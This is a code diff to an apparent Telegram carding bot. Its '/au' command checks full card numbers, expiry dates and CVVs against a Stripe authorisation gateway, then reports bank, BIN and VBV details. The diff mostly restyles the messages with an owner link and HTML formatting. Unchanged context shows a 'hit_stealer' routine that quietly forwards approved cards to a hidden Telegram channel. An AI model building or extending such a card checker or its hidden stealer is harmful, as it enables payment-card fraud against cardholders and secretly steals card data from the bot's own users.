@@ -13,6 +13,10 @@ from BOT.tools.hit_stealer import send_hit_if_approved
 # Replace with your actual channel ID
 STEALER_CHANNEL_ID = -1002549777556
 
+# Owner DM Link (clickable ㊕)
+OWNER_DM = "https://t.me/spid_3r"
+SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
+
 async def send_hit_if_approved(client: Client, text: str):
     try:
         await client.send_message(chat_id=STEALER_CHANNEL_ID, text=text)
@@ -23,6 +27,7 @@ async def send_hit_if_approved(client: Client, text: str):
 async def stripe_auth_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
+        first_name = message.from_user.first_name
         checkall = await check_all_thing(Client, message)
 
         gateway = "Stripe Auth"
@@ -43,7 +48,7 @@ async def stripe_auth_cmd(Client, message):
 
 ↪ <b>ᴜꜱᴀɢᴇ :</b> /au cc|mes|ano|cvv
 ━━━━━━━━━━━━━━━━━━━━"""
-            await message.reply_text(resp, message.id)
+            await message.reply_text(resp, message.id, parse_mode="HTML")
             return
 
         cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
@@ -52,19 +57,19 @@ async def stripe_auth_cmd(Client, message):
 
         firstresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ. ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□"""
         await asyncio.sleep(0.5)
-        firstchk = await message.reply_text(firstresp, message.id)
+        firstchk = await message.reply_text(firstresp, message.id, parse_mode="HTML")
 
         secondresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□"""
         await asyncio.sleep(0.5)
-        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
+        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp, parse_mode="HTML")
 
         start = time.perf_counter()
         session = httpx.AsyncClient(timeout=30, follow_redirects=True)
@@ -78,11 +83,11 @@ async def stripe_auth_cmd(Client, message):
 
         thirdresp = f"""✧ ᴄʜᴇᴄᴋɪɴɢ... ✧
 
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
+{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>
+{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{gateway}</i>
+{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■■"""
         await asyncio.sleep(0.5)
-        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
+        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp, parse_mode="HTML")
 
         brand = getbin[0] if len(getbin) > 0 else "Unknown"
         type_ = getbin[1] if len(getbin) > 1 else "Unknown"
@@ -92,6 +97,7 @@ async def stripe_auth_cmd(Client, message):
         flag = getbin[5] if len(getbin) > 5 else ""
         currency = getbin[6] if len(getbin) > 6 else "Unknown"
 
+        # VBV lookup
         vbv_status = "Not Found"
         try:
             with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
@@ -107,22 +113,35 @@ async def stripe_auth_cmd(Client, message):
                     vbv_status = parts[2] if len(parts) > 2 else parts[1]
                     break
             if not bin_found:
-                vbv_status = "Rejected ✗"
+                vbv_status = "Rejected ❌"
         except FileNotFoundError:
             vbv_status = "VBV file missing"
 
-        finalresp = f"""
-[玄] 𝘾𝘾 -» <code>{fullcc}</code>
-[玄] 𝙎𝙩𝙖𝙩𝙪𝙨 -» {status}
-[玄] 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» {response}
-[玄] 𝘽𝙞𝙣 -» {brand} — {type_} — {level}
-[玄] 𝘽𝙖𝙣𝙠 -» {bank}
-[玄] 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 -» {country} {flag}
-[玄] 𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» {gateway}
-[玄] 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 -» <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> ↯ {role}
-[玄] 𝙏𝙞𝙢𝙚 -» {time.perf_counter() - start:0.2f}s"""
+        # Convert status to unified emoji format
+        if "Approved" in status or "✅" in status:
+            final_status = "Approved ✅"
+        elif "Declined" in status or "❌" in status:
+            final_status = "Declined ❌"
+        else:
+            final_status = status
+
+        finalresp = f"""{final_status}
+
+{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>
+{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {gateway}
+{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {response}
+
+{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand} — {type_} — {level}
+{SYMBOL} 𝗕ᴀɴᴋ: {bank}
+{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}
+{SYMBOL} 𝗩𝗕𝗩: {vbv_status}
+
+{SYMBOL} 𝗧ᴏᴏᴋ {time.perf_counter() - start:.2f} 𝘀ᴇᴄᴏɴᴅs
+{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: {first_name} ({role})
+{SYMBOL} 𝗢ᴡɴᴇʀ: <a href='tg://user?id=8340881349'>S⊶P⊶I⊶D⊶E⊶R</a>"""
+
         await asyncio.sleep(0.5)
-        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
+        await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp, disable_web_page_preview=True, parse_mode="HTML")
         await setantispamtime(user_id)
         await deductcredit(user_id)
         if status == "Approved ✅":
